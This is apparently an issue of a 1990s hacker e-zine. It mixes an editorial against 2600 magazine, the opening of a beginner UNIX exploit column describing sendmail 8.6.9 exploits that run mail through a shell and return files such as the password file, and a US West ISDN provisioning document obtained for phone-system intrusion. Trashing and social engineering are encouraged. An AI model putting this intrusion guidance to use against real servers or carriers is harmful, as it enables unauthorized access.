			       INTRODUCTION 
			       ____________ 

Well, we are a bit later than we had expected. I had hoped to get issue
3 out the door by the end of april, and here it is, October. Wierd how easy
it is to get off track like that. Anyway, this issue should be considered
to be worth waiting for. (at least I think it is).

This issue we have the second installment of UNIX problems, with a variety
of different exploits, Terminal visits US West and brings us the ultimate
acronym list, and Random explains some ISDN switching items.


As always, send submissions, ideas, questions, complaints and such things to:


bf130@freenet.hsc.colorado.edu


Or on any semi-decent 303 board.


And extra special thanks go to all of you who wrote us with your compliments.
It is because of your praise that this issue exists.

	      Editorial: 2600 Meetings - Ghost in the Machine
	      -----------------------------------------------

  We in 303 have had a bit of difficulty with our 2600 meetings.  I started
the Denver 2600 in October 1994 after living here for 1 month and being totally
bored. It was a democratic setup, all of the people involved with setting up
said meeting voted and revoted on such things as locale/time/place/etc... We
decided that to have the meeting at 2pm on the first SATURDAY of the month
was the best for all. This has come to the test and passed with flying colors.
There are perhaps one or 2 people who Saturday is difficult for, and given that
we have a turnout averaging between 18-25 people each month, that is a small
minority. The meetings recently got to the point where they were beyond our
advertising, and people knew when to be there, where to go, etc... and we had
large turnouts despite the lack of advertising in recent months. We thought it
would be a good idea to become "official" and have Emmanuel print the meeting
in 2600, and then let it coast.
  
  Emmanuel's response was to ignore us completely, AND publish some "guide-
lines" in his magazine. The guidelines included such things as the fact that
one CANNOT HAVE a 2600 meeting on Saturday at 2 or any time/date other than
Friday at approx 5pm. 
  
  The only kind of people who can make a meeting at 5pm on a friday are school
kids and/or jobless people. When I lived in Chicago it was nearly impossible
to get to the north side for the meetings by 5pm unless I left at 2. It was
generally grumbled about, but no one ever did anything about it. Here, we did
something about it from the start, and have recieved nothing but friction
from the person who we least expected friction from.
  
  More recently, Terminal spoke with Emmanuel on IRC at some length about this
situation, and was informed that a turnout of 20-25 people was not sufficient
to even warrant a meeting, let alone a SATURDAY meeting. In addition, Random
(who is involved in the Sacramento, CA meets) was moving to change the date
and time of his meeting, and Emmanuel told Terminal that the Sacramento meeting
was dissolved. Not in reality, but in Emmanuel's mind.
  
  These things cannot be totally ignored. Emmanuel thinks that he owns the
name 2600 and that he can do as he pleases with our meetings, regardless of
our own feelings on the matter. *MOST* 2600 meetings have approximately the
same turnout as ours do. I know Chicago did, and that is a metro area of over
9 million people. Denver has 2 million and our meetings are still growing.
Therefore, your meetings are just as insignifigant to him as ours is, and if
you take even the slightest bit of initiative, he will attempt to crush it.
  
  As always, I think that it is Time for a Change, and I suggest that if you
attend some local 2600 meeting, take a vote, see if Saturday (or *ANY* day)
is better, vote among the people that are there, or that come often, and
decide for YOURSELVES when your meeting should be. Also, look at the latest
release of 2600. Then look at the last 4 years (someone in your NPA probably
has a lot of back issues if you don't). 2600 magazine is a piece of complete
trash now. Emmanuel will print anything, and it has ruined an otherwise decent
idea. STOP BUYING IT!
  
  This is merely a suggestion, but if you look at the big picture
here, you will see a disturbing trend on the part of 2600 magazine and
it's editor.

Well Adam, at this time the main place to get TFC on the net is:

ftp.netcom.com/pub/da/daemon9/Phile/TFC

If anyone has an ftp site that wishes to carry ftp, or a BBS for that matter,
please mail me somewhere and we'll work out the details, and you'll get a
free plug in the next issue. <grin>

The best place I've found is Dr. Who's Radio Telephony Archive which is located
at:

http://www.l0pht.com/~drwho/

It has just about everything you could possibly want.

Well, the best place to get recent bugs is to talk to other people or find
them for yourself.

Finding them for yourself is easy if you have a lot of spare time and/or
the source code for the operating system in question.

Getting them from other hackers is hard if you haven't been around for 50
years, married thier sister, and given them 20 pints of blood. Even then it 
is no elementary task.

Failing that, subscribe to the bugtraq mailing list:

bugtraq-request@fc.net

put something as a subject, and then in the body of the letter put:

SUBSCRIBE bugtraq <Your email address>

You should get a welcome message shortly, and then you will recieve all the
mail sent to that list. Bugtraq has been pretty tame of late, and I haven't
been subscribed to it for several months, but it is certainly better than
nothing.

Here it is. As you may have seen in the first issue, this was to be a 4 part
series. Actually, I would like to retract that statement. It may be 2 parts,
it may be 7. It really depends a lot on what kind of feedback I recieve from
readers. The only reason I am adding a second installment is the incredible
amount of requests I've recieved on the subject.

Again, this is not intended as an article for advanced hackers. Instead it
is an introductory type article aimed toward the beginning to intermediate
hacker. As I have become more and more painfully aware, it's no longer how
much you know (although that does help sometimes) it's what kind of tools you
have. Here are a few more for your toolbox.

For those of you who have been whining that these bugs are old, useless, 
and outdated, I have two words for you. Boo Hoo. This column is still the
only one I've seen in an h/p zine with complete bugs of any kind, not to
mention a detailed walkthrough, so until I see some more people putting out
articles like this, I'd advise the whiny types to shut up. (Side note: all
of these are still functional on a GREAT number of machines. Those who don't
know that, apparently don't hack.)

Since most of these bugs do not require walkthroughs, several of them will
simply be the exploit itself.

Basically, here is an example for the format of the file:

XProgram: sm869.remote
X
Xyou can:
X
X   run the body of the mail through a shell if 
X   sendmail is allowed to run a shell.
X
X   write the whole message to a file.
X
X   have it send back a file to an account you specify.
X
XThe last option is supposed to remove the file after sending
Xit but I found that it hasn't in my tests.  Why?  Well
Xit has multiple recipients, one of the recipients is a
Xrecipient that will never go through.  So the data file
Xgets kept around until it gives up on that host.  This
Xcan be several days.
X
XProblems:
X
X  The action you specify will happen every 30minutes (the
X  queue time, may be different) until it gives up sending
X  to the unreachable host.  (Actually this may be false.
X  I haven't left it around long enough to see if this happens.
X  Perhaps sendmail is smart enough to remove the other recipients
X  that did get delievered from the queue file).
X
X  If you send a file back to yourself it may get removed
X  several days later.  If you get the password file or
X  some other critical file you had better be ready to clean
X  up.
X
X  Lots of logs.  Its fairly obvious from the log files that
X  some hokey pokey is going on.  If you're sending a file
X  back to yourself then you're pointing a finger at one
X  of your accounts
X
XYou have to go into the program to change the options you
Xwant.  The code is fairly well commented so this shouldn't
Xbe any problem.
X
XProgram: sm869.local
X
XSame thing as above really except it works even if sendmail
Xdoesnt check identd and you dont have to specify an unreachable
Xhost.  The file goes straight to the queue.

                                 presents

                         ISDN Single Line Service

                            by:  Random [TYM]

-------------------------------------------------------------------------------
 This document cannot be issued upon request.   !!! TOP SECRET Motha fucka !!!
-------------------------------------------------------------------------------

Single Line Service is a digital service that provides integrated voice/data
over a 2-wire customer facility, utilizing N1-2 technology and the public 
switched network. The service offering distributes voice and/or data over a
Basic Rate ISDN interface of 2B+1D channels.

* Single Line Service Provisioning USOC: (Universal Service Order Code)

The Interface and Loop combination equals the Basic Rate Service (BRS). The
interface and loop provisions for the facility from the customer's premises
to the Central office/switch. The provisioning USOC is listed below.

        N2Q - (U Interface) 2-wire interface on non-loaded loop, with 
        distant limitations with 2B1Q Line Coding. This the DSL (Digital
        Subscriber Line) which may be reffered to as either a DSL, pipe
        or loop.

* Single Line Service Standard Package:

The Customer can have up to six call appearances per terminal. At least one
call appearance must be a Primary Directory Number (PDN). The first or main
Directory number on a terminal is referred to as a "Primary Directory Number
(PDN)." It is always assigned as Call Appearance button 1.

Each terminal is assigned one PDN. As part of the Standard Packages for
Single Line Service ISDN Service, a customer can have up to two terminals
(each with a PDN) per DSL. Other call appearances can be any combination of:

        * Analog Call Appearance
        * One Primary Directory Number and Additional Appearances of PDN
          (maximum five call appearances)
        * One Secondary Directory Number (SDN) with (maximum of four call
          appearances)
        * Shared Directory Number (maximum two)

Additional call appearances are available at rates and charges specified in
Optional Features and Functions.

* Standard Feature Package USOC - Billing Only               

        BMEHB - (voice and data 2B+d)

* Single Line Service Logical Terminal Type USOC's:

Single Line Service uses logical terminals (Smart Telephones) that are
manufactured to specifically work with NI-2 Technology. These terminals
include buttons for lines (call appearances) and features.

One of the following USOC's would appear on the Single Line Service order
for the services working off of the DSL.

        LNM1X - Single Line Service provisioning USOC. (Voice and Data
                [handle like LTQ1X])

        LTH4X - Provisioning USOC for the Voice and Data package. D-Channel
                Packet USOC for flat rate. (Handle like LTQ4X)        
                
* Secondary Directory Number USOC:

        MO6 - First time the number appears, but is not Primary Directory
              Number (PDN)

* Additional Call Appearance USOC's:

        DO8 - Shared Call Appearance of a Primary Number (LNM1X).

        MAZ - Analog termination on an ISDN station.

The following is a complete list of USOC's and FID's used with Single Line 
Service. This list includes USOC's and FID's associated with the Custom 
Calling Features (CCF), billing USOC's and line assignable USOC's.

FID's: The FID's associated with Single Line Services are Listed Below.

This list is not intended to be an all inclusive list; however, it includes
the FID's the LPC should be aware of.

        BS - Bearer Service defines the channel capabilities. This FID 
        describes what each B and D channel is capable of for 2B+D.

        Elements:

                        B Channels
                       ------------
        DMD = On Demand Service, for Circuit Switched Voice and Data.

                        D Channels
                       ------------
        D channel possible entries:
        SX = X.25 Packet Switching and/or Q.931 Signaling.

        The Single Line Service will be:
                /BS DMD DMD SX (2B+D)

 NOTE: The SWITCH system interputs the FID BS to assign the B and D channel
        POE(s).

CAPP  - Call Appearance - CAPP indicates a call designation on a multiple 
        appearance terminal for primary and secondary line numbers, or
        Multiline Hunt Group terminal numbers served by a 5ESS. The CAPP FID
        is required on 5ESS orders.

        CAPP indicates the button numbers the line terminates on, the number
        of appearances on the terminal, if the manual exclusion is required,
        and the ringing pattern.
        The button number of the first appearance is indicated after CA.
        The number of appearances on the same terminal is indicated after
        NBR.
        
        CA and NBR are attributes the LPC is concerned with.

                USOC/CAPP CA.1, NBR.3,

        The CA indicates the key appearance on the ISDN set and NBR 
        indicates the number of times it appears on the set, which is 
        3 times. The First three keys on the ISDN set has the same TN
        (Telephone Number) The TN appears on key 1, 2, and 3.

        Call appearances for the voice and data packages (e.g. LNM1X/LTH1X,
        LNM5X, LTH5X) USOC's are maintained and processed in the SWITCH
        system. The FID CAPP which follows the USOC's indicates the key
        appearances. The Key appearance is indicated in SWITCH as KPI (Key
        Position Indicator). The SVCID when the CAPP is present behind
        these USOC's equals the NPA+PN+KPI.

CLS   - Common Language Circuit Indentification (CLCI). Voice and Circuit
        Switched Data and Packet.

        The ISDN pipe is not dependent on a telephone number. A serial
        number common language is used for indentification.

                Data is: Service Code IB and Modifier is SA.
                Example: 29.IBSA.444678..MS

        Each packet device has its own CLS (not the same as the CLS of the
        pipe).

                Data is: Service Code QS and Modifier is ZA.
                Example: 29.QSZA.444678..MS

CSO   - Circuit Switched Channel Options - identifies which channels support
        circuit switched voice or data.

        Data is: CSV.X (Circuit Switched Voice) where X is 0-2 indicating:
        
                0 = Voice not supported
                1 = Voice on B channel

        CSVC.XXX (Circuit Switched Voice Channel) where XXX is:

                ANY = Either Channel
                NO  = None

        CSD.X (Circuit Switched Data) where X is 0-2 indicating:

                0 = Data not supported
                1 = Data on 1 B Channel
                2 = Data on both B Channels

        CSDC.XXX (Circuit Switched Data Channel)

                ANY = Either Channel
                NO  = None

        Example: LNM1X 2B+D
                 /CSO CSV.1, CSVC.ANY, CSD.2, CSDC.ANY

This is only an example if voice and data are requested, a common use of the
2B+D is for data only.

        Example: LNM1X (2B+D)
                 /CSO CSV.0, CSVC.NO, CSD.2, CSDC.ANY

The data values of MP and PP are only applicable for Custom ISDN.

DCLS  - Digital Subscriber Line (DSL) Class of Service - Single Line
        Service NI-2 supports a standard DSL which can support from one up
        to 8 actual devices on a DSL.

                Data is: STD

        Single Line Service is always:

                Example: /DES DCLS STD

        The FID DCLS will be used following the FID DES until the systems
        can handle the STD Data. This method will be updated when it is no
        longer necessary to use the DES.

DSNA  - Digital Services Network Assignment - DSNA is the common language 
        of the DSL associated with this service. It is used to identify on
        which DSL various services work. The SWITCH system read reads this
        FID to associate the services to the pipe.

        The DSNA is the same as the CLS on the DSL.

        DSNA should appear on all USOC's, except for N2Q and the Optional
        feature USOC's.

                Example: DSNA 20.IBSA.002268..MS

DTN   - Data Terminal Number. DTN is used to denote the data terminal
        number for dialing. DTN follows the USOC's LNM4X. (Could be the
        same number as the PDN, depending on the CPE requirement.)

MADN  - Multiple Appearance of a Telephone Number - MADN is used to denote
        whether a shared number is the primary appearance or a subsequent
        appearance. The FID MADN P is always used on a LNM1X that appears
        on another terminal (it would be a DO8 on the other terminal).

MAXB  - Maximum B Channel Packet Users - indicates the maximum number of
        B packet users that will be on the DSL. A customer can have up to
        eight terminals on one DSL.

MDPK  - Maximum D Channel Packet Users - indicates the maximum number of         
        D packet users that will be on the DSL. A customer should specify
        the exact number of devices and not the MAX of 8 if this is not
        true.

            Data is: 0-8  (number of devices)

            Example: /MDPK 2  (2B+D entry)
                     /MDPK 0  (2B+S entry)

MTER  - Maximum Number of Terminals - indicates the maximum number of
        terminals on a DSL. This includes both the circuit and packet
        switched devices. A customer should specify the exact number of
        devices and not use the MAX of 8 if this is not true.

            Data is: 0-8  (number of devices)

            Example: /MTER 2

PN    - Primary Number - PN is the first Directory/Telephone number assigned
        to a terminal.

SPID  - Service Profile Identifier - The SPID ties together the multiple
        funtions a terminal is capable of providing. The SPID is the
        primary number of each terminal on a DSL (both circuit & packet
        terminals). If the customer's Terminal Type A is being used for
        circuit switched data simultaneously on both B channels, ask if
        two SPID's are required. If two SPID's are required two LNM1X/LTH1X
        USOC's will be needed each with a new PDN.

        With NI-2 the customer and/or the technicians, whomever is programing
        the customer's SPID, must put in at least twelve digits.
        RCMAC is only required to put in 10.

        The recommended standard SPID format is:

        For terminal type A or C.
        XY-XXX-XXXX-0-XX

        Where XY:

                    X = 0  (SPID is TN format)
                    Y = 1  (Circuit Switched)
                    Y = 2  (Packet Switched)

        Where XXX-XXXX:

                    XXX = Telephone number prefix
                    XXXX = Line Number Format

        Where 0:

                    0 = numeric 0's are used as the Network Address Type for
                    NI-2.

        Where XX:

                    XX = 2 Digit Sharing Terminal ID. Terminal Type C.
                    Data is 00-62 this number can be assigned by the
                    customer if they choose or by the originator.

        Where XX:

                    XX = 2 Digit Non-sharing Terminal ID. Terminal Type A.
                    Data is 00-62 this number can be assigned by the
                    customer if they choose or by the originator.

        If a device is capable of more than one function, the SPID that is
        used depends on the hierarchy. For example, let's say a device is
        capable of circuit switched voice and data, and packet. Because it
        is one device, the SPID would be the same for both devices and the
        circuit switched SPID would be used because it is higher in the
        hierarchy than packet switched.

                    For a Terminal Type C. Example:

                    /SPID 01-345-3456-0-01  (Circuit-Switch TN format)
                    /SPID 03-345-8765-0-01  (D Packet-Switch TN format),
                    if no circuit switched voice or data is requested.
                    /SPID 01-345-3456-0-01  (Circuit Switch TN and packet)

                    For a Terminal Type A. Example:

                    /SPID 01-345-3456-0-00  (Circuit-Switch TN format)
                    /SPID 03-345-8765-0-00  (D Packet-Switch TN format),
                    if no circuit switched voice or data is requested.
                    /SPID 01-345-3456-0-00  (Circuit Switched TN and packet)

            If a customer requires all 20 digits, depending on their CPE, the
            following format examples are used.

                    /SPID 013453456012345678-62  (Terminal Type A)
                    /SPID 013453456012345678-00  (Terminal Type C)

            The customer will provide the information after the telephone number
            and before the dash.


RMA TYPE:   C001-420: Order held in manual assistance file. Successful
            transaction requires COSMOS manual input.  The Single Line
            Service order will flow through LFACS and SWITCH.  The RMA
            notice is for COSMOS only.

MANUAL TRIGGER REASON:

0420:   Order Level Manual Assistance
        RMA Reason is USOC N2Q
        RMA Reason is USOC LNM1X

        The service order could fall out at LFACS for no loop available pairs.
        If the order falls out at LFACS for no loop qualified pairs, the PLA
        must refer this to the Facility Specialist for loop qualified pairs.

Basic ISDN will flow through LFACS and SWITCH, but RMA at COSMOS.

RESOLUTION:

    Manual establishment is required in COSMOS via the COSMOS shell programs
    ADD-PIPE and ADD-TERM.

DESCRIPTION:

    Single Line Service is a digital service that provides an integrated
    voice/data capability over the customers 2-wire facility utilizing NI-2
    technology and the public switched network.

    The NI-2 technology provides a digital network architecture which provides
    both a voice connection and a high low speed data connection simultaneously
    over existing telephone lines (twisted pair). These telephone lines are
    called Digital Subscriber Lines (DSL) and also referred to as the Pipe.

    The DSL between the customers premises and the central office is the Basic
    Rate Service (BRS) 2B+D.

    The DSL has a transmission rate of 144 Kbps (Kilobits per second) divided
    into three channels. There are two "B" channels capabile of 64 Kbps each
    and one "D" channel used for signaling and packet switched service.

    Each B channel is capable of:

        - Circuit Switched Voice
        - Circuit Switched Data

    The D channel is capable of:

        - Signaling (Q.931 protocol)
        - Packet Data (X.25 protocol)

    Single Line Service offers three types of applications. They are:

        - voice only
        - voice and data (includes circuit switched voice, data and/or packet
          switched data)
        - data only (includes circuit switched data and/or packet switched data)


BASIC RATE SERVICE (BRS):

    The BRS consists of up to three distinct channels on one pair of wires; one
    or two B (Bearer) channels and a D (Delta) channel. BRS is offered on either
    an Individual Case Basis (ICB) or in a packaged offering referred to as U S
    WEST Single Line Service. U S WEST Single Line Service is available on a
    measured rate basis.

    B (Bearer Channel - The B channel carries circuit switched voice and/or data
    communications and packet switched data communications at speeds of up to
    64Kbps, from the customer premises over the loop facility, to the central
    office.

    D (Delta) Channel - The D channel carries signaling and/or packet switched
    data communications at speeds up to 16Kbps on Basic Rate Interface and up
    to 64Kbps on Primary Rate Interface, from the customer premises to the
    central office. The D channel has both data and signaling functionality.

Primary Rate Interface (PRI):

    PRI has a capacity of 1.544 megabits per second (Mbps). There are twenty-
    three B channels and one D channel, known as 23B+D access. The B channels
    carry the circuit switched and packet data communications while the D
    channel carries the signaling information. The Primary Rate Interface is
    only available by individual case bases (ICB).

SERVICE ORDER ISSUANCE:

    Service orders are issued as POTS (Plain Old Telephone Service) orders.
    Customer premises must be loop qualified (no extender technology) to
    qualify for Single Line Service. Customer premises must, also, be serviced
    from a 5ESS switch or Optical Remote Module (ORM). Single Line Service will
    not be provisioned between central offices.

    Single Line Service carries the Class of Service (CS) of 13Q. If an ISDN
    customer wants an ISDN application beyond the Single Line Service offering,
    the customer can purchase ISDN on an ICB.

DUE DATE INTERVALS:    

    Single Line Service has a seven interval for nondesign. The seven day
    begins once the facilities have been pre-looped qualified and Marketing
    negotiates a due date (DD) with the customer. The seventh day is the DD.
    A three day interval is given to the customer if:

        - Adding a feature
        - Adding a terminal to an established N2Q
        - Moving a terminal to a different N2Q

    The above applies for 10 lines or less. If a customer has more than 10 lines
    going in, the Intervals will be on a ICB (Individual Case Basis) basis.

    The Single Line Service order will carry ADSR N (Administrative Design
    Service Review NO) a critical section with three Critical Date entries
    when issued nondesign. This is not a CPC processed order. The Critical
    dates for Single Line Service orders are required to ensure U S WEST
    meets the customer DD.

            * APP   - Application Date - 1 day.

            * SID   - Service Issue Date - 1 day.

            * LAM   - Loop Assigned and Make Up.  This is the date the LPC
                      must have the order assigned. If the LPC doesn't meet
                      this date, it will greatly affect the RCMAC, frames
                      and installation - 1 day.

            * DVA   - Designed Verified and Assigned.  This is an RCMAC and
                      frame date - 2 days.

            * PTD   - Plant Test Date.  This is the date for the installer -
                      1 day.


    An example below shows how the intervals would appear on the service order
    if the customers DD is 11-14.

            ID      DD 11-14
        ---CTL      SID 11-08/LAM 11-04/DVA 11-11/PTD 11-12


STANDARD INTERFACES:

    NI-2 does not refer to Point-to-Point or Multipoint interfaces. NI-2
    Supports Standard Interfaces.

    All Standard Interfaces support up to eight terminals per BRS. A BRS
    supporting NI-1 allows a customer to have one device active on one BRS.
    This one device may be capable of both circuit switched data and voice,
    as well as packet switched data. Only one terminal may use a B Channel at
    one time. The D Channel maybe used by eight packet switched data terminals
    simultaneously.

PRIMARY DIRECTORY NUMBER (PDN):

    The first or main Directory Number (DN) on a terminal is referred to as a
    *Primary Directory Number* (PDN). Each logical terminal will have a primary
    directory number associated with it. Only one terminal can have this number
    as its primary DN.

    Each terminal is assigned one PDN. Up to eight terminals, each with with one
    PDN are allowed for the additional PDN's.

    The USOC LNM1X is the PDN USOC. A PDN may have multiple call appearances.

    A PDN can be shared with other terminals. When the PDN is shared, the MADN
    FID is shown with the above USOC's.

SHARED DIRECTORY NUMBER:

    Shared Directory Numbers allows several users to share one or more call
    appearances for a particular directory number. All Shared Directory Numbers
    must be provisioned from the same serving central office. The Shared
    Directory Number USOC is D08.

COSMOS SYSTEM:

    * RELATED FACILITY FILE:

    The Related Facility capability in COSMOS associates the Single Line
    Service terminal(s) to the Single Line Service DSL(s). The PL ID associated
    with each terminal off of the DSL is identified as a Related Facility. The
    RF file keeps track of the number of appearances of the PL and places a
    unique identification against the Single Line Service DSL and each terminal.
    The unique indentification is MULT APP (Multiple Appearance) and the number
    of appearances of the PL (e.g. 2 terminals off of pipe = MULT APP 3; Pipe
    PL ID counts as 1 appearance and the PL ID appears on 2 terminals for a
    total of three appearances).

    A new prefix ATR (attribute) associates the related circuits to the DSL.
    The applicable FID's that are entered behind the prefix "ATR" are:

            * CCF (Custom Calling Features)
            * DSNA (Digital Services Network Assignment)
            * FF (Interoffice Frame Facilities)
            * GF (General Facility (e.g. SFG's ,etc.))
            * KEY (Key Number)
            * MADN (MADN Service)
            * MLI (Multiple Line Appearance Indentifier)
            * PL (Private Line)
            * RK (Release Key)
            * TN (Telephone Number)
            * TEI (Telephone Equipment Indentification)

COSMOS  "SHELL"  PROGRAMS:

    There are several Shell programs administered in COSMOS to accommodate
    the establishment of the ISDN and ISDN like circuits in COSMOS. These
    programs are accessed through a standalone terminal (A SYNC Terminal)
    or a asynchronous terminal with dial up capabilities. Transaction RNS
    allows the user in the SHELL programs. The shell programs are:

        *   ADD-PIPE
        *   ADD-TERM
        *   APPEND-PIPE
        *   D-POE-SEL

            *   ADD-PIPE is used to establish the ISDN pipe(s).

            *   ADD-TERM is used to establish the ISDN logical terminals.

            *   APPEND-PIPE is used to append to an existing service order.

            *   D-POE-SEL is used when changing the OE and POE for
                maintenance reasons, and multiple hunts.

    The Shell programs must be performed to establish these circuits in COSMOS.
    These programs have the capabilities of load balancing the office, as well
    as, automatically assigning the OE and POE. Establishing the Single Line
    Service circuits outside of the Shell program will cause potential switch
    and customer problems. USING TRANSACTION SOE IS NOT AN OPTION, except for
    Single Line Service multiline hunt.

    Transaction MAQ (Manual Assistance File Inquiry) in the delete mode must
    be performed before establishing the, Single Line Service circuits in the
    Shell programs ADD-PIPE, ADD-TERM or APPEND-PIPE. The MA tigger is set for
    a COSMOS MA which generates a C1 RMA. All C1 RMA's are placed in the MAQ
    file. If the Single Line Service order is not removed, the order will RUP
    back each time the ADD-PIPE and ADD-TERM are established which generates
    more paper to the downstream systems.


EDITING THE SHELL PROGRAMS:

    The Shell programs ADD-PIPE, ADD-TERM and APPEND-PIPE can be edited
    utilizing the existing TED file commands. When the Shell programs ask
    the question "Is thos satisfactory? (answer yes (y), no (n) or edit (e),"
    the user at that point would answer e for edit.

    COSMOS places the user in the TED file (scratch pad) at this point. COSMOS
    responds with 2 to 3 numerics (e.g. 104). This represents the number of
    characters in the TED file. The user can print the file by entering 1,$n.
    1,$P prints the file from the beginning of the file to the end of the file.
    1,$n prints the file and numbers each line from the beginning of the file
    to the end of the file.

    The following operations may be performed when editing the TED file.

        *   Text is appended to the file with the 'A' command. (Change xxx for
            yyy and print the lines.) Information is entered after the current
            line into a buffer area exactly as typed. No limit on the number of
            lines entered.

        *   Lines of the file are printed with the 'P' command.

            -   1,$P - Prints the beginning of the file to the end of the file.

            -   1,$n - Prints and numbers each line from beginning to the end.

            -   P - Prints the current line.

            -   C - Change Mode - Current line is changed.

            -   D - Delete Mode - Delete current line.

            -   I - Insert Mode - Text is inserted before the current line.

            -   S - Substitute Mode - On current line, "yyy" is substituted
                    for "xxx". Only the part of the line matching "xxx" will
                    be changed.

                        Example:    s;xxx;yyy;P

        *   Updating the file is accomplished with the "W" command. The text is
            stored by entering command "W" and line feed.

        *   The user exits the file from editing with the letter Q (quit).

        NOTE:   The user should always write (W) the file prior to entering the
                quit (Q) command in order to save the changes made in the text
                editor.

        *   Period (.) indicates end of input when performing the commands.

            A (append), C (change), and/or I commands, a period (.) must be
            entered before writing or quiting the file to indicate that is the
            end of the input.

   Well, you might be thinking right now "Great, just what we need is another
acronym list" .. Well, let me assure you that this is not just ANOTHER
acronym list, this is *THE* acronym list... This acronym list is straight
from USWest, so you can be sure that all information is correct, either
that or USWest is very confused.

   You may find that it is a bit USWest specific, or does not cover all of
the acronyms that maybe AT&T and other Long Distance providers use.. But
if you often trash, Social Engineer, or hack in USWest territory, you will
find the following information invaluable.
